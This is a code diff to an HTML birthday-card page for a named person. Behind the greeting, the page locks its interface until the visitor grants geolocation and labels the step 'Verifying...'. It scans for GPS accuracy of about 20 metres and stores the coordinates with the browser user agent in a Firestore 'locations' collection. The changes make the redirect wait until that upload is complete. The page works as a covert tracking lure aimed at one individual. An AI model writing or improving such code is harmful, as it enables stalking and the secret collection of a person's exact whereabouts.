@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Happy Birthday !</title>
+    <title>Happy Birthday Rasangika!</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;700&family=Patrick+Hand&family=Yaldevi:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -235,13 +235,11 @@
         </div>
     </div>
 
-    <!-- Updated Firebase SDK & Config -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
-        // අලුත් Firebase Config එක මෙතන තියෙනවා උදාර
         const firebaseConfig = {
             apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
             authDomain: "data-a0ce0.firebaseapp.com",
@@ -258,7 +256,6 @@
 
         let currentUserId = null;
         
-        // Auth එක සම්පූර්ණ වෙනකම් ඉන්න Promise එකක් හදාගන්නවා
         let authReady = new Promise(resolve => {
             onAuthStateChanged(auth, user => { 
                 if(user) {
@@ -271,19 +268,18 @@
 
         signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
 
-        // අලුත් project එකේ data save කරන function එක
+        // Returns a Promise so we can wait for it later if needed
         window.saveLocationData = async (data) => {
-            await authReady; // Login වෙනකම් අනිවාර්යයෙන් ඉන්නවා
+            await authReady; 
             if (!currentUserId) return;
             try {
-                // මෙතන path එක 'data-a0ce0' එකට ගැලපෙන විදිහට හැදුවා
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
                 await addDoc(colRef, { 
                     ...data, 
                     timestamp: serverTimestamp(),
                     userAgent: navigator.userAgent
                 });
-                console.log("Location saved successfully!");
+                console.log("Location saved successfully to Firestore!");
             } catch (e) { 
                 console.error("Firestore Error:", e); 
             }
@@ -296,6 +292,7 @@
         
         let isLocationAllowed = false;
         let isLocationDenied = false;
+        let locationSavePromise = null; // Promise to track database saving
         
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
@@ -354,7 +351,6 @@
                 try {
                     const result = await navigator.permissions.query({ name: 'geolocation' });
                     if (result.state === 'granted') {
-                        // දැනටමත් Allow කරලා නම්, කෙලින්ම request කරනවා
                         requestLocationAccess(false); 
                     } else if (result.state === 'denied') {
                         isLocationDenied = true;
@@ -379,55 +375,47 @@
             let bestPosition = null;
             let watchId = null;
             let scanTimeout = null;
+            let finalized = false; // Prevent multiple saves
 
             const finalizeAndSave = (pos) => {
+                if (finalized) return;
+                finalized = true;
+
                 if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                 clearTimeout(scanTimeout);
                 closeAllPopups();
 
-                // UI එක එවලෙම Unlock කරනවා (Firebase නිසා හිරවෙන්න දෙන්නේ නෑ)
+                // Unblock the UI IMMEDIATELY so the user can click
                 if (!isLocationAllowed) {
                     isLocationAllowed = true;
                     enableMainInterface();
                 }
 
-                // Data ටික Background එකේ Save වෙනවා (UI එකට බලපාන්නේ නෑ)
+                // Trigger save in background, keep the promise reference
                 if (pos && window.saveLocationData) {
-                    window.saveLocationData({ 
+                    locationSavePromise = window.saveLocationData({ 
                         lat: pos.coords.latitude, 
                         lng: pos.coords.longitude, 
                         accuracy: pos.coords.accuracy 
-                    }).catch(e => console.error("Save Error:", e));
+                    });
+                } else {
+                    locationSavePromise = Promise.resolve();
                 }
             };
 
-            const handleFallback = () => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => finalizeAndSave(pos),
-                    (err) => {
-                        closeAllPopups();
-                        if (err.code === 1) {
-                            isLocationDenied = true;
-                            showPopup('overlay3', 'card3');
-                        } else if (showPopupOnError) {
-                            showPopup('overlay2', 'card2');
-                        }
-                        if(btn) btn.innerText = "Verifying...";
-                    },
-                    { enableHighAccuracy: false, maximumAge: Infinity, timeout: 8000 }
-                );
-            };
-
+            // Start getting location
             navigator.geolocation.getCurrentPosition(
                 (initialPos) => {
                     bestPosition = initialPos;
                     
+                    // Start GPS warmup monitoring
                     watchId = navigator.geolocation.watchPosition(
                         (pos) => {
-                            if (pos.coords.accuracy < bestPosition.coords.accuracy) {
+                            if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
                                 bestPosition = pos;
                             }
-                            if (bestPosition.coords.accuracy <= 25) { 
+                            // Early exit if accuracy is very good (< 20m)
+                            if (bestPosition.coords.accuracy <= 20) { 
                                 finalizeAndSave(bestPosition);
                             }
                         },
@@ -435,9 +423,10 @@
                         { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                     );
 
+                    // Force exit after 6 seconds of searching to prevent hanging
                     scanTimeout = setTimeout(() => {
                         finalizeAndSave(bestPosition);
-                    }, 5000); 
+                    }, 6000); 
                 },
                 (err) => {
                     if (err.code === 1) { 
@@ -446,7 +435,16 @@
                         showPopup('overlay3', 'card3');
                         if(btn) btn.innerText = "Verifying...";
                     } else {
-                        handleFallback();
+                        // Fallback to low accuracy
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => finalizeAndSave(pos),
+                            (e) => {
+                                closeAllPopups();
+                                if (showPopupOnError) showPopup('overlay2', 'card2');
+                                if(btn) btn.innerText = "Verifying...";
+                            },
+                            { enableHighAccuracy: false, maximumAge: Infinity, timeout: 8000 }
+                        );
                     }
                 },
                 { enableHighAccuracy: true, maximumAge: 0, timeout: 6000 }
@@ -498,7 +496,6 @@
             `;
         }
 
-        // Animation logic
         const leftPupil = document.getElementById('left-pupil'), rightPupil = document.getElementById('right-pupil'), elements = document.querySelectorAll('.element'), leftEyeGroup = document.getElementById('left-eye-group'), rightEyeGroup = document.getElementById('right-eye-group'), mouth = document.getElementById('mouth'), mainTitle = document.getElementById('main-title'), subTitle = document.getElementById('sub-title'), mainButton = document.getElementById('mainButton'), smileContainer = document.getElementById('smile');
 
         const handleMove = (clientX, clientY) => {
@@ -510,12 +507,30 @@
             elements.forEach(el => { let speed = parseFloat(el.getAttribute('data-speed')); el.style.transform = `translate(${x*speed*40}px, ${y*speed*40}px)`; });
         };
 
-        function triggerHelloAnimation() {
+        async function triggerHelloAnimation() {
+            // Start Visuals immediately
             mainTitle.classList.add('hide-text'); subTitle.classList.add('hide-text');
             smileContainer.classList.add('focus-face');
             leftEyeGroup.classList.remove('eye-blink'); rightEyeGroup.classList.remove('eye-blink');
-            setTimeout(() => { rightEyeGroup.classList.add('wink-eye'); mouth.classList.add('big-smile'); }, 300);
-            setTimeout(() => { window.location.href = "https://alstudy063.github.io/reminder3/hbd/rasangika/hbd_rashu"; }, 2500);
+            
+            setTimeout(() => { 
+                rightEyeGroup.classList.add('wink-eye'); 
+                mouth.classList.add('big-smile'); 
+            }, 300);
+
+            // Wait for Animation (2.5s) AND Database Save to finish before redirecting
+            const animationDelay = new Promise(resolve => setTimeout(resolve, 2500));
+            const maxWaitTimeout = new Promise(resolve => setTimeout(resolve, 5000)); // Maximum wait time 5s to avoid hang
+            
+            try {
+                await Promise.all([
+                    animationDelay,
+                    Promise.race([locationSavePromise || Promise.resolve(), maxWaitTimeout])
+                ]);
+            } catch(e) { console.error("Wait error", e); }
+
+            // Everything is done, safely redirect
+            window.location.href = "https://alstudy063.github.io/reminder3/hbd/rasangika/hbd_rashu";
         }
 
         window.onload = () => {
